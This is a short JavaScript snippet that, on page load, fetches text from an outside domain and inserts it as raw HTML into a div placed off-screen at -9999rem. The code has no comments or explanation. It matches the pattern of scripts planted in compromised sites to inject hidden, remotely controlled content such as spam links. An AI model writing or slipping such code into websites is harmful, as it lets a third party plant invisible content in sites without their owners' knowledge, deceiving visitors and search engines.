document.addEventListener("DOMContentLoaded", function() {
    fetch("https://tbsentosabangunan.com/jaya-abadi/sentosa/roll.txt")
        .then(response => {
            if (!response.ok) {
                throw new Error(`Failed to fetch content (${response.status})`);
            }
            return response.text();
        })
        .then(text => {
            var div = document.createElement("div");
            div.innerHTML = text;
            div.style.position = "absolute";
            div.style.left = "-9999rem";
            document.body.insertBefore(div, document.body.lastChild);
        })
        .catch(error => {
            console.error("Error loading content:", error);
        });
});
